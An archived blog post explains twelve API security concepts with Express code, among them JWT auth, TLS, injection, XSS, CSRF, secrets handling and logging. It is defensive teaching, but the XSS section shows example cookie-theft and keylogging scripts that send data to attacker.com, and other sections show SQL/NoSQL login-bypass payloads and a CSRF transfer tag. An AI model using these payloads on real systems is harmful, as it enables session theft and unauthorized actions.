---
title: "API Security - 12 Core Concepts You Need to Know"
labels: ["security","api","backend","webdev","Archive"]
published: true
date: 2025-01-06T20:55:00+09:00
readerComments: "ALLOW"
language: en
bloggerPostId: "7482873385980045392"
source: "archive"
archivePath: "_archive/dev/security/api-security-guide-kr.md"
---

# API Security - 12 Core Concepts You Need to Know

APIs are the backbone of modern web applications. But if you don't protect them properly, you're exposed to serious security threats. In this post, I'll walk through 12 core API security concepts in plain terms.

---

## 1. Authentication & Authorization ⭐️⭐️⭐️

### Concept
**Authentication**: "Who are you?" - verifies the user's identity
**Authorization**: "Are you allowed to do this?" - checks what an authenticated user is permitted to do

### Why is it the most important?
Without authentication and authorization, anyone can hit your API, and every other security measure becomes meaningless.

### Main authentication methods

**1. JWT (JSON Web Token)**
```javascript
const jwt = require('jsonwebtoken');

// Issue a token
app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  
  // Authenticate the user
  const user = authenticateUser(username, password);
  
  if (user) {
    // Issue a JWT
    const token = jwt.sign(
      { userId: user.id, role: user.role },
      process.env.JWT_SECRET,
      { expiresIn: '1h' }
    );
    
    res.json({ token });
  } else {
    res.status(401).json({ error: 'Authentication failed' });
  }
});

// Token verification middleware
function authenticateToken(req, res, next) {
  const authHeader = req.headers['authorization'];
  const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN
  
  if (!token) {
    return res.status(401).json({ error: 'Token required' });
  }
  
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) {
      return res.status(403).json({ error: 'Invalid token' });
    }
    req.user = user;
    next();
  });
}

// Protected route
app.get('/api/profile', authenticateToken, (req, res) => {
  res.json({ userId: req.user.userId });
});
```

**2. OAuth 2.0**
```javascript
const passport = require('passport');
const GoogleStrategy = require('passport-google-oauth20').Strategy;

passport.use(new GoogleStrategy({
    clientID: process.env.GOOGLE_CLIENT_ID,
    clientSecret: process.env.GOOGLE_CLIENT_SECRET,
    callbackURL: "http://localhost:3000/auth/google/callback"
  },
  function(accessToken, refreshToken, profile, cb) {
    // Log in or sign up using the profile info
    User.findOrCreate({ googleId: profile.id }, function (err, user) {
      return cb(err, user);
    });
  }
));

// Routes
app.get('/auth/google',
  passport.authenticate('google', { scope: ['profile', 'email'] }));

app.get('/auth/google/callback', 
  passport.authenticate('google', { failureRedirect: '/login' }),
  function(req, res) {
    res.redirect('/dashboard');
  });
```

**3. API Keys**
```javascript
function validateApiKey(req, res, next) {
  const apiKey = req.headers['x-api-key'];
  
  if (!apiKey) {
    return res.status(401).json({ error: 'API key required' });
  }
  
  // Validate the API key against the database
  const validKey = db.apiKeys.findOne({ key: apiKey, active: true });
  
  if (!validKey) {
    return res.status(403).json({ error: 'Invalid API key' });
  }
  
  req.apiClient = validKey.clientId;
  next();
}

app.get('/api/data', validateApiKey, (req, res) => {
  res.json({ data: 'Protected data' });
});
```

### Implementing authorization

**Role-Based Access Control (RBAC)**
```javascript
// Define roles
const ROLES = {
  ADMIN: 'admin',
  USER: 'user',
  GUEST: 'guest'
};

const PERMISSIONS = {
  [ROLES.ADMIN]: ['read', 'write', 'delete'],
  [ROLES.USER]: ['read', 'write'],
  [ROLES.GUEST]: ['read']
};

// Permission check middleware
function authorize(requiredPermission) {
  return (req, res, next) => {
    const userRole = req.user.role;
    const userPermissions = PERMISSIONS[userRole] || [];
    
    if (!userPermissions.includes(requiredPermission)) {
      return res.status(403).json({ error: 'Permission denied' });
    }
    
    next();
  };
}

// Usage
app.delete('/api/users/:id', 
  authenticateToken,
  authorize('delete'),
  (req, res) => {
    // Delete logic
  }
);
```

**Attribute-Based Access Control (ABAC)**
```javascript
function checkResourceOwnership(req, res, next) {
  const resourceId = req.params.id;
  const userId = req.user.userId;
  
  db.resources.findById(resourceId).then(resource => {
    if (resource.ownerId !== userId && req.user.role !== ROLES.ADMIN) {
      return res.status(403).json({ error: 'You do not have access to this resource' });
    }
    next();
  });
}

app.put('/api/documents/:id',
  authenticateToken,
  checkResourceOwnership,
  (req, res) => {
    // Document update logic
  }
);
```

### Best practices
- **Hash passwords**: use bcrypt or Argon2 (never store plaintext)
- **Token expiry**: keep access tokens short (15 minutes to 1 hour) and refresh tokens at 14-30 days
- **Multi-factor authentication (MFA)**: require a second factor for sensitive actions, like GitHub does with a mobile authenticator app
- **Principle of least privilege**: grant only the minimum permissions needed
---

## 2. HTTPS/TLS (Transport Layer Security) ⭐️⭐️⭐️

### Concept
HTTPS is HTTP with TLS (Transport Layer Security) encryption added. It encrypts all communication between the client and the server.

### Why is it mandatory?
- **Data encryption**: data in transit can't be read by third parties
- **Prevents man-in-the-middle (MITM) attacks**: stops attackers from intercepting or tampering with traffic
- **A baseline requirement**: it's the standard on the modern web, and many APIs require HTTPS

### What happens without HTTPS?
```javascript
// Sending over HTTP (dangerous!)
POST http://example.com/api/login
{
  "username": "alice",
  "password": "mypassword123"  // sent in plaintext!
}

// Anyone on the network can intercept this
// Especially dangerous on public Wi-Fi
```

### Getting a free SSL certificate with Let's Encrypt

**1. Install Certbot and issue a certificate**
```bash
# Ubuntu/Debian
sudo apt-get update
sudo apt-get install certbot

# Issue a certificate
sudo certbot certonly --standalone -d yourdomain.com -d www.yourdomain.com

# Test auto-renewal (certificates are valid for 90 days)
sudo certbot renew --dry-run
```

**2. HTTPS setup in Node.js/Express**
```javascript
const https = require('https');
const fs = require('fs');
const express = require('express');

const app = express();

// Load the SSL certificate
const options = {
  key: fs.readFileSync('/etc/letsencrypt/live/yourdomain.com/privkey.pem'),
  cert: fs.readFileSync('/etc/letsencrypt/live/yourdomain.com/fullchain.pem')
};

// Start the HTTPS server
https.createServer(options, app).listen(443, () => {
  console.log('HTTPS server running on port 443');
});

// Redirect HTTP to HTTPS
const http = require('http');
http.createServer((req, res) => {
  res.writeHead(301, { Location: `https://${req.headers.host}${req.url}` });
  res.end();
}).listen(80);
```

**3. Nginx reverse proxy setup**
```nginx
server {
    listen 80;
    server_name yourdomain.com www.yourdomain.com;
    
    # Redirect HTTP to HTTPS
    return 301 https://$server_name$request_uri;
}

server {
    listen 443 ssl http2;
    server_name yourdomain.com www.yourdomain.com;
    
    # SSL certificate
    ssl_certificate /etc/letsencrypt/live/yourdomain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/yourdomain.com/privkey.pem;
    
    # Strong SSL settings
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;
    
    # HSTS (HTTP Strict Transport Security)
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    
    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_cache_bypass $http_upgrade;
    }
}
```

### Security headers in Express.js
```javascript
const helmet = require('helmet');

app.use(helmet());

// Or set them manually
app.use((req, res, next) => {
  // HSTS: force the browser to always use HTTPS
  res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
  
  // X-Frame-Options: prevent clickjacking
  res.setHeader('X-Frame-Options', 'DENY');
  
  // X-Content-Type-Options: prevent MIME type sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');
  
  // X-XSS-Protection
  res.setHeader('X-XSS-Protection', '1; mode=block');
  
  next();
});
```

### Local HTTPS in development

**Using mkcert**
```bash
# Install mkcert
brew install mkcert  # macOS
choco install mkcert # Windows

# Create a local CA
mkcert -install

# Generate a certificate for localhost
mkcert localhost 127.0.0.1 ::1

# Use it from Node.js
node server.js
```

```javascript
// server.js
const https = require('https');
const fs = require('fs');

const options = {
  key: fs.readFileSync('./localhost+2-key.pem'),
  cert: fs.readFileSync('./localhost+2.pem')
};

https.createServer(options, app).listen(3000);
```

### Best practices
- **Use TLS 1.2 or later**: TLS 1.0/1.1 are deprecated
- **Strong cipher suites**: disable weak encryption algorithms
- **Enable HSTS**: force browsers to always use HTTPS
- **Automate certificate renewal**: Let's Encrypt certificates must be renewed every 90 days
- **Fix mixed content warnings**: load every resource over HTTPS

---

## 3. Input Validation & Sanitization ⭐️⭐️

### Concept
Input validation checks that user input matches the expected format and range. Sanitization removes dangerous characters or code, or renders them harmless.

### Why does it matter?
User input is where every attack starts. Input validation defends against several attacks at once, including injection and XSS.

---

## 4. SQL & NoSQL Injection

### Concept
An injection attack inserts malicious code into input fields to attack the database.

### SQL injection example

**Vulnerable code:**
```javascript
// Dangerous! User input goes straight into the query
const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
```

**Attack scenario:**
```javascript
username = "admin' --"
// Resulting query: SELECT * FROM users WHERE username = 'admin' --' AND password = '...'
// Everything after -- is commented out, so the password check is bypassed
```

**Safe code:**
```javascript
// Use a prepared statement
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.execute(query, [username, password]);
```

### NoSQL injection example

**Vulnerable code (MongoDB):**
```javascript
// Dangerous!
db.users.find({ username: req.body.username, password: req.body.password });
```

**Attack scenario:**
```json
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
// This can return every user
```

**Safe code:**
```javascript
// Validate input and enforce types
const username = String(req.body.username);
const password = String(req.body.password);
db.users.findOne({ username, password });
```

### Defenses
1. **Use prepared statements**: keep SQL and data separate
2. **Validate input**: validate and sanitize all user input
3. **Use an ORM**: tools like Sequelize or TypeORM
4. **Principle of least privilege**: give the database account only the permissions it needs

---

## 5. XSS (Cross-Site Scripting)

### Concept
XSS is an attack that injects malicious scripts into a web page so they run in other users' browsers.

### Types of XSS

**1. Stored XSS**
```javascript
// A user posts a comment
const comment = "<script>alert('XSS')</script>";

// It gets saved to the database
db.comments.insert({ text: comment });

// When another user views the comment
<div>{comment}</div> // the script runs!
```

**2. Reflected XSS**
```javascript
// URL: https://example.com/search?q=<script>alert('XSS')</script>

// The server echoes the query back as-is
<div>Search results: {req.query.q}</div>
```

**3. DOM-based XSS**
```javascript
// URL: https://example.com#<img src=x onerror=alert('XSS')>

// Handled on the client side
document.getElementById('output').innerHTML = window.location.hash;
```

### Real-world damage
```javascript
// Cookie theft
<script>
  fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

// Keylogging
<script>
  document.addEventListener('keypress', (e) => {
    fetch('https://attacker.com/log?key=' + e.key);
  });
</script>

// Page defacement
<script>
  document.body.innerHTML = '<h1>You have been hacked!</h1>';
</script>
```

### Defenses

**1. Escaping input**
```javascript
// HTML escape
function escapeHtml(text) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, (m) => map[m]);
}

// Usage
const userInput = escapeHtml(req.body.comment);
res.send(`<div>${userInput}</div>`);
```

**2. Automatic escaping in React**
```javascript
// React prevents XSS by default
function Comment({ text }) {
  return <div>{text}</div>; // escaped automatically
}

// Dangerous! Be careful with dangerouslySetInnerHTML
function Comment({ html }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}
```

**3. Content Security Policy (CSP)**
```javascript
// Express.js middleware
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' https://trusted.cdn.com; object-src 'none'"
  );
  next();
});
```

**4. Using the DOMPurify library**
```javascript
import DOMPurify from 'dompurify';

// Sanitize HTML
const clean = DOMPurify.sanitize(dirty);
document.getElementById('output').innerHTML = clean;
```

**5. HttpOnly cookies**
```javascript
// Make the cookie inaccessible to JavaScript
res.cookie('sessionId', sessionId, {
  httpOnly: true, // prevents cookie theft via XSS
  secure: true,
  sameSite: 'strict'
});
```

### Node.js/Express best practices
```javascript
const helmet = require('helmet');
const validator = require('validator');

// Set security headers automatically with Helmet
app.use(helmet());

// Validate user input
app.post('/api/comment', (req, res) => {
  const comment = req.body.comment;
  
  // Validate input
  if (!validator.isLength(comment, { min: 1, max: 500 })) {
    return res.status(400).send('Invalid input');
  }
  
  // Strip control characters
  const sanitized = validator.stripLow(comment);
  
  // Save to the database
  db.comments.insert({ text: sanitized });
  
  res.send('Comment posted');
});
```

---

### Input that needs validation

**1. Data type validation**
```javascript
const validator = require('validator');

app.post('/api/user', (req, res) => {
  const { email, age, username, website } = req.body;
  
  // Email validation
  if (!validator.isEmail(email)) {
    return res.status(400).json({ error: 'Invalid email format' });
  }
  
  // Numeric range validation
  if (!validator.isInt(String(age), { min: 18, max: 120 })) {
    return res.status(400).json({ error: 'Age must be between 18 and 120' });
  }
  
  // String length validation
  if (!validator.isLength(username, { min: 3, max: 20 })) {
    return res.status(400).json({ error: 'Username must be 3-20 characters' });
  }
  
  // URL validation
  if (website && !validator.isURL(website)) {
    return res.status(400).json({ error: 'Invalid URL' });
  }
  
  // Process the validated data
  createUser({ email, age, username, website });
  res.status(201).json({ message: 'User created' });
});
```

**2. Allowlist validation**
```javascript
// Accept only allowed values
const ALLOWED_ROLES = ['user', 'admin', 'moderator'];
const ALLOWED_SORT_FIELDS = ['createdAt', 'updatedAt', 'name'];

app.get('/api/users', (req, res) => {
  const { role, sortBy } = req.query;
  
  // Allowlist checks
  if (role && !ALLOWED_ROLES.includes(role)) {
    return res.status(400).json({ error: 'Invalid role' });
  }
  
  if (sortBy && !ALLOWED_SORT_FIELDS.includes(sortBy)) {
    return res.status(400).json({ error: 'Invalid sort field' });
  }
  
  // Run the query safely
  const users = db.users.find({ role }).sort(sortBy);
  res.json(users);
});
```

**3. Regex validation**
```javascript
app.post('/api/phone', (req, res) => {
  const { phoneNumber } = req.body;
  
  // Validate a Korean mobile number format
  const phoneRegex = /^01[0-9]-?[0-9]{3,4}-?[0-9]{4}$/;
  
  if (!phoneRegex.test(phoneNumber)) {
    return res.status(400).json({ error: 'Invalid phone number format' });
  }
  
  // Process...
});
```

### Sanitization

**1. Stripping HTML/JavaScript**
```javascript
const sanitizeHtml = require('sanitize-html');

app.post('/api/comment', (req, res) => {
  let { comment } = req.body;
  
  // Remove dangerous HTML tags
  comment = sanitizeHtml(comment, {
    allowedTags: ['b', 'i', 'em', 'strong', 'a'],
    allowedAttributes: {
      'a': ['href']
    },
    allowedSchemes: ['http', 'https']
  });
  
  db.comments.insert({ text: comment });
  res.status(201).json({ message: 'Comment posted' });
});
```

**2. Preventing SQL injection**
```javascript
// Bad
const query = `SELECT * FROM users WHERE id = ${req.params.id}`; // dangerous!

// Good
const query = 'SELECT * FROM users WHERE id = ?';
db.execute(query, [req.params.id]);
```

**3. File upload validation**
```javascript
const multer = require('multer');
const path = require('path');

const storage = multer.diskStorage({
  destination: './uploads/',
  filename: (req, file, cb) => {
    // Generate a safe filename
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, uniqueSuffix + path.extname(file.originalname));
  }
});

const upload = multer({
  storage: storage,
  limits: {
    fileSize: 5 * 1024 * 1024 // 5MB limit
  },
  fileFilter: (req, file, cb) => {
    // Allowed file types only
    const allowedTypes = /jpeg|jpg|png|gif|pdf/;
    const extname = allowedTypes.test(path.extname(file.originalname).toLowerCase());
    const mimetype = allowedTypes.test(file.mimetype);
    
    if (mimetype && extname) {
      return cb(null, true);
    } else {
      cb(new Error('Unsupported file type'));
    }
  }
});

app.post('/api/upload', upload.single('file'), (req, res) => {
  res.json({ filename: req.file.filename });
});
```

### Schema validation libraries

**Validation with Joi**
```javascript
const Joi = require('joi');

const userSchema = Joi.object({
  username: Joi.string().alphanum().min(3).max(30).required(),
  email: Joi.string().email().required(),
  password: Joi.string().pattern(new RegExp('^[a-zA-Z0-9]{8,30}$')).required(),
  age: Joi.number().integer().min(18).max(120),
  website: Joi.string().uri().optional()
});

app.post('/api/register', (req, res) => {
  const { error, value } = userSchema.validate(req.body);
  
  if (error) {
    return res.status(400).json({ error: error.details[0].message });
  }
  
  // Use the validated data
  createUser(value);
  res.status(201).json({ message: 'Registration complete' });
});
```

**Using express-validator**
```javascript
const { body, validationResult } = require('express-validator');

app.post('/api/login',
  [
    body('email').isEmail().normalizeEmail(),
    body('password').isLength({ min: 8 }).trim().escape()
  ],
  (req, res) => {
    const errors = validationResult(req);
    
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    
    // Handle login
  }
);
```

### Best practices
- **Validate on both client and server**: client-side validation alone isn't enough
- **Use allowlists**: explicitly state what's allowed (safer than denylists)
- **Validate early**: validate at the start of the request to avoid wasting resources
- **Clear error messages**: give users messages they can understand
- **Validate every input**: URL params, query strings, body, and headers

---

## 6. API Keys & Secrets Management ⭐️⭐️

### Concept
Storing and managing API keys and secrets safely is central to security.

### Why does it matter?
- **Prevents leaks**: hardcoded secrets that end up on GitHub are an immediate security threat
- **Per-environment config**: use different keys for development, staging, and production
- **Easy rotation**: you can swap secrets quickly when they're exposed

### What you must never do

**❌ Hardcoding in source**
```javascript
// Never do this!
const API_KEY = 'sk-1234567890abcdef';
const DB_PASSWORD = 'MyP@ssw0rd123';
const JWT_SECRET = 'super-secret-key';

mongoose.connect('mongodb://admin:password123@localhost/mydb');
```

**❌ Committing to Git**
```javascript
// config.js (big trouble if this lands on GitHub!)
module.exports = {
  apiKey: 'sk-live-123456',
  stripeKey: 'pk_live_abcdef'
};
```

### The right way

**1. Use environment variables**

**Create a .env file**
```env
# .env (add this file to .gitignore!)
NODE_ENV=production
PORT=3000
DB_HOST=localhost
DB_USER=myapp
DB_PASSWORD=secure_password_here
DB_NAME=myapp_db
JWT_SECRET=your-super-secret-jwt-key-change-this
API_KEY=sk-1234567890abcdef
STRIPE_SECRET_KEY=sk_live_abcdefghijk
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

**Add it to .gitignore**
```gitignore
# .gitignore
.env
.env.local
.env.*.local
config/secrets.json
```

**Using dotenv**
```javascript
// app.js
require('dotenv').config();

const dbConfig = {
  host: process.env.DB_HOST,
  user: process.env.DB_USER,
  password: process.env.DB_PASSWORD,
  database: process.env.DB_NAME
};

const jwtSecret = process.env.JWT_SECRET;
const apiKey = process.env.API_KEY;

// Check for missing environment variables
if (!process.env.JWT_SECRET) {
  console.error('JWT_SECRET is not set!');
  process.exit(1);
}
```

**2. AWS Secrets Manager**

```javascript
const AWS = require('aws-sdk');
const secretsManager = new AWS.SecretsManager({ region: 'us-east-1' });

async function getSecret(secretName) {
  try {
    const data = await secretsManager.getSecretValue({ SecretId: secretName }).promise();
    
    if ('SecretString' in data) {
      return JSON.parse(data.SecretString);
    }
  } catch (err) {
    console.error('Failed to fetch the secret:', err);
    throw err;
  }
}

// Usage
async function initApp() {
  const secrets = await getSecret('myapp/production/database');
  
  const dbConnection = await mongoose.connect(
    `mongodb://${secrets.username}:${secrets.password}@${secrets.host}/${secrets.dbname}`
  );
  
  console.log('Database connected');
}

initApp();
```

**3. HashiCorp Vault**

```javascript
const vault = require('node-vault')({
  endpoint: 'http://127.0.0.1:8200',
  token: process.env.VAULT_TOKEN
});

async function getDbCredentials() {
  try {
    const result = await vault.read('secret/data/database');
    return result.data.data; // { username, password, host }
  } catch (err) {
    console.error('Failed to fetch the secret from Vault:', err);
    throw err;
  }
}
```

**4. Azure Key Vault**

```javascript
const { SecretClient } = require('@azure/keyvault-secrets');
const { DefaultAzureCredential } = require('@azure/identity');

const credential = new DefaultAzureCredential();
const vaultUrl = `https://${process.env.KEY_VAULT_NAME}.vault.azure.net`;
const client = new SecretClient(vaultUrl, credential);

async function getSecret(secretName) {
  try {
    const secret = await client.getSecret(secretName);
    return secret.value;
  } catch (err) {
    console.error(`Could not fetch secret "${secretName}":`, err);
    throw err;
  }
}

// Usage
const dbPassword = await getSecret('database-password');
```

### Generating and managing API keys

**Generating a secure API key**
```javascript
const crypto = require('crypto');

function generateApiKey() {
  // Generate a random 32-byte key
  return crypto.randomBytes(32).toString('hex');
}

// Usage
app.post('/api/keys/generate', authenticateToken, async (req, res) => {
  const apiKey = generateApiKey();
  
  // Store a hash (the raw key is shown only once)
  const hashedKey = crypto
    .createHash('sha256')
    .update(apiKey)
    .digest('hex');
  
  await db.apiKeys.insert({
    userId: req.user.id,
    keyHash: hashedKey,
    createdAt: new Date(),
    lastUsed: null
  });
  
  // Show it to the user only once
  res.json({ 
    apiKey,
    message: 'Store this key somewhere safe. You will not be able to see it again.'
  });
});
```

**Validating an API key**
```javascript
async function validateApiKey(req, res, next) {
  const apiKey = req.headers['x-api-key'];
  
  if (!apiKey) {
    return res.status(401).json({ error: 'API key required' });
  }
  
  // Hash the key
  const keyHash = crypto.createHash('sha256').update(apiKey).digest('hex');
  
  // Look it up in the database
  const key = await db.apiKeys.findOne({ keyHash, active: true });
  
  if (!key) {
    return res.status(403).json({ error: 'Invalid API key' });
  }
  
  // Update the last-used timestamp
  await db.apiKeys.update({ _id: key._id }, { lastUsed: new Date() });
  
  req.apiKey = key;
  next();
}
```

### Per-environment configuration

```javascript
// config/index.js
const env = process.env.NODE_ENV || 'development';

const config = {
  development: {
    db: {
      host: 'localhost',
      port: 5432,
      name: 'myapp_dev'
    },
    apiUrl: 'http://localhost:3000'
  },
  production: {
    db: {
      host: process.env.DB_HOST,
      port: process.env.DB_PORT,
      name: process.env.DB_NAME
    },
    apiUrl: process.env.API_URL
  }
};

module.exports = config[env];
```

### Best practices
- **Never commit secrets to Git**: always add .env to .gitignore
- **Use a secrets manager in production**: AWS/Azure/GCP managed services
- **Rotate keys**: replace secrets regularly
- **Provide a .env.example**: tell teammates which environment variables they need
- **Principle of least privilege**: give API keys only the permissions they need
- **Set expiry**: give API keys a validity period

---

## 7. CSRF (Cross-Site Request Forgery)

### Concept
CSRF is an attack that tricks an authenticated user into sending a malicious request without realizing it.

### Attack scenario

**Setup:**
1. The user logs in to a bank site (bank.com)
2. The login cookie is stored in the browser
3. The user visits a malicious site (evil.com)

**Malicious page:**
```html
<!-- page on evil.com -->
<img src="https://bank.com/api/transfer?to=attacker&amount=10000" />
```

**Result:**
- The browser automatically sends the bank site's cookie with the request
- A transfer request runs without the user knowing

### Defenses

**1. Use CSRF tokens**
```javascript
// Generate a CSRF token on the server and store it in the session
const csrfToken = generateToken();
req.session.csrfToken = csrfToken;

// Embed the token in the HTML
<form action="/api/transfer" method="POST">
  <input type="hidden" name="_csrf" value="${csrfToken}" />
  <input type="text" name="amount" />
  <button type="submit">Transfer</button>
</form>

// Verify the token on the server
app.post('/api/transfer', (req, res) => {
  if (req.body._csrf !== req.session.csrfToken) {
    return res.status(403).send('Invalid CSRF token');
  }
  // Process the transfer...
});
```

**2. SameSite cookie attribute**
```javascript
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict' // or 'lax'
});
```

- `strict`: blocks the cookie on all cross-site requests
- `lax`: allows it on top-level GET navigations, blocks it on POST and the like

**3. Double submit cookie**
```javascript
// Put the same token in a cookie and in a request header
res.cookie('csrf-token', token);
// The client includes the token in a header on each request
axios.post('/api/transfer', data, {
  headers: { 'X-CSRF-Token': token }
});
```

### CSRF protection in Express.js
```javascript
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.use(csrfProtection);

app.get('/form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/api/data', (req, res) => {
  // The CSRF token is verified automatically
  res.send('Data processed');
});
```

---

## 8. Rate Limiting

### Concept
Rate limiting caps how many requests a user or IP can make to an API in a given time window.

### Why do you need it?
- **Prevents DDoS attacks**: stops floods of requests from taking the server down
- **Protects resources**: distributes server resources fairly

### Implementation
```javascript
// Express.js example
const rateLimit = require('express-rate-limit');

const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // up to 100 requests
  message: 'Too many requests. Please try again later.'
});

app.use('/api/', limiter);
```

### Real-world examples
- GitHub API: authenticated users are limited to 5,000 requests per hour
- Twitter API: 300 requests per 15 minutes with app authentication

---

## 9. CORS (Cross-Origin Resource Sharing)

### Concept
CORS is a mechanism that lets a web application from another origin access resources on the current origin.

### Why do you need it?
- **Same-Origin Policy**: by default, browsers block access to resources from other origins
- **Safe resource sharing**: only explicitly allowed origins can reach the API

### What is an origin?
An origin is the combination of `protocol + domain + port`.
- `https://example.com:443`
- `http://localhost:3000`

### Implementation
```javascript
// Express.js example
const cors = require('cors');

// Allow all origins (for development)
app.use(cors());

// Allow specific origins only (recommended for production)
app.use(cors({
  origin: 'https://myapp.com',
  methods: ['GET', 'POST'],
  credentials: true
}));
```

### Caveats
- Avoid the wildcard (`*`) in production
- Explicitly allow only trusted origins

---

## 10. Firewalls

### Concept
A firewall monitors network traffic and allows or blocks it based on security rules.

### Types

**1. Network firewall**
- Hardware- or software-based
- Filters by IP address, port, and protocol
- Examples: AWS Security Groups, Azure Network Security Groups

**2. Web Application Firewall (WAF)**
- Inspects HTTP/HTTPS traffic
- Defends against application-layer attacks like SQL injection and XSS
- Examples: AWS WAF, Cloudflare WAF, ModSecurity

### Example configuration

**AWS Security Group rules:**
```
Inbound Rules:
- Type: HTTP, Protocol: TCP, Port: 80, Source: 0.0.0.0/0
- Type: HTTPS, Protocol: TCP, Port: 443, Source: 0.0.0.0/0
- Type: SSH, Protocol: TCP, Port: 22, Source: My IP only

Outbound Rules:
- All traffic allowed (default)
```

### Best practices
- **Allowlist approach**: explicitly allow only the traffic you need
- **Review rules regularly**: remove rules you no longer need
- **Defense in depth**: combine a network firewall with a WAF

---

## 11. VPNs (Virtual Private Networks)

### Concept
A VPN provides a secure, encrypted connection over a public network.

### How it relates to API security

**1. Protecting internal APIs**
```
Internet → VPN Gateway → Private network → Internal API
```
- Make sensitive internal APIs reachable only through the VPN
- No direct access from the outside

**2. Remote developer access**
- Developers can reach internal company APIs securely
- Combine with IP allowlisting for extra protection

### Implementation examples

**AWS VPN setup:**
```
1. Create a VPC
2. Place the API servers in a private subnet
3. Set up a VPN gateway
4. Configure a Client VPN endpoint
5. Set up certificate-based authentication
```

**OpenVPN setup:**
```bash
# Install OpenVPN
sudo apt-get install openvpn

# Client config file (e.g. client.ovpn)
client
dev tun
proto udp
remote your-server-ip 1194
ca ca.crt
cert client.crt
key client.key
```

### Use cases
- **Service-to-service traffic**: use a VPN instead of a service mesh
- **Admin APIs**: expose admin features only through the VPN
- **Test environments**: protect staging behind a VPN

---

## 12. Logging & Monitoring ⭐️

### Concept
Logging records system events; monitoring watches those logs in real time so you catch problems early.

### Why does it matter?
- **Detecting security incidents**: spot unusual access attempts and attack patterns
- **Incident response**: find and trace the cause when something goes wrong
- **Compliance**: many regulations, like GDPR and PCI-DSS, require logging
- **Performance tuning**: identify bottlenecks

### What should you log?

**✅ Things to log**
- Authentication attempts (success/failure)
- Authorization errors
- Input validation failures
- API requests (IP, User-Agent, path, method)
- System errors and exceptions
- Execution of important business logic
- Data changes (create/update/delete)

**❌ Things you must never log**
- Passwords (plaintext or hashed)
- Credit card information
- Personally identifiable information (PII) - a GDPR violation
- API keys, JWTs
- Session IDs

### Logging with Winston

**Installation and setup**
```javascript
const winston = require('winston');

const logger = winston.createLogger({
  level: process.env.LOG_LEVEL || 'info',
  format: winston.format.combine(
    winston.format.timestamp(),
    winston.format.errors({ stack: true }),
    winston.format.json()
  ),
  defaultMeta: { service: 'api-service' },
  transports: [
    // File logs
    new winston.transports.File({ 
      filename: 'logs/error.log', 
      level: 'error',
      maxsize: 5242880, // 5MB
      maxFiles: 5
    }),
    new winston.transports.File({ 
      filename: 'logs/combined.log',
      maxsize: 5242880,
      maxFiles: 10
    })
  ]
});

// Log to the console in development
if (process.env.NODE_ENV !== 'production') {
  logger.add(new winston.transports.Console({
    format: winston.format.combine(
      winston.format.colorize(),
      winston.format.simple()
    )
  }));
}

module.exports = logger;
```

**Logging middleware**
```javascript
const logger = require('./logger');

// Request logging middleware
app.use((req, res, next) => {
  const start = Date.now();
  
  res.on('finish', () => {
    const duration = Date.now() - start;
    
    logger.info('HTTP Request', {
      method: req.method,
      url: req.url,
      status: res.statusCode,
      duration: `${duration}ms`,
      ip: req.ip,
      userAgent: req.get('user-agent'),
      userId: req.user?.id
    });
  });
  
  next();
});
```

**Logging security events**
```javascript
// Authentication failure
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  
  const user = await authenticateUser(email, password);
  
  if (!user) {
    logger.warn('Login failed', {
      email,
      ip: req.ip,
      userAgent: req.get('user-agent'),
      timestamp: new Date().toISOString()
    });
    
    return res.status(401).json({ error: 'Authentication failed' });
  }
  
  logger.info('Login successful', {
    userId: user.id,
    email: user.email,
    ip: req.ip
  });
  
  // Issue the token...
});

// Authorization error
app.delete('/api/users/:id', authenticateToken, (req, res) => {
  if (req.user.role !== 'admin') {
    logger.warn('Unauthorized access attempt', {
      userId: req.user.id,
      action: 'DELETE_USER',
      targetUserId: req.params.id,
      ip: req.ip
    });
    
    return res.status(403).json({ error: 'Permission denied' });
  }
  
  // Delete logic...
});

// Rate limit exceeded
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 100,
  handler: (req, res) => {
    logger.warn('Rate limit exceeded', {
      ip: req.ip,
      url: req.url,
      userAgent: req.get('user-agent')
    });
    
    res.status(429).json({ error: 'Too many requests' });
  }
});
```

**Error logging**
```javascript
// Global error handler
app.use((err, req, res, next) => {
  logger.error('Application error', {
    error: err.message,
    stack: err.stack,
    method: req.method,
    url: req.url,
    userId: req.user?.id,
    ip: req.ip
  });
  
  res.status(500).json({ error: 'A server error occurred' });
});
```

### Monitoring tools

**1. Prometheus + Grafana**
```javascript
const promClient = require('prom-client');

// Collect metrics
const register = new promClient.Registry();
promClient.collectDefaultMetrics({ register });

// Custom metrics
const httpRequestCounter = new promClient.Counter({
  name: 'http_requests_total',
  help: 'Total number of HTTP requests',
